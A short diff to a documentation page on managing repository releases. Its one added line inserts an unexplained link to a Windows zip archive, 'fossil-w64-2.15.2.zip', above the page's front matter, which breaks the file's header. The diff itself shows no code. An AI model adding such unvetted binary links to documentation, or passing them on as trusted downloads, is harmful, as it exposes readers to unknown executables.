@@ -1,3 +1,4 @@
+[fossil-w64-2.15.2.zip](https://github.com/github/docs/files/7439273/fossil-w64-2.15.2.zip)
 ---
 title: Managing releases in a repository
 intro: You can create releases to bundle and deliver iterations of a project to users.
